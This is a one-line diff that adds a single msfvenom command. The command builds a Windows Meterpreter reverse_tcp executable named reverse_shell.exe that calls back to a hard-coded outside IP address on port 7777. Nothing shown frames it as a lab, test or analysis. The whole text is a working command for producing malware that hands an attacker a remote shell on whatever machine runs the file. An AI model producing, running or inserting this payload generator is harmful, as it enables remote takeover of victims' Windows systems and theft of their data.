@@ -1,0 +1,1 @@
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=176.100.43.89 LPORT=7777 -f exe -o reverse_shell.exe
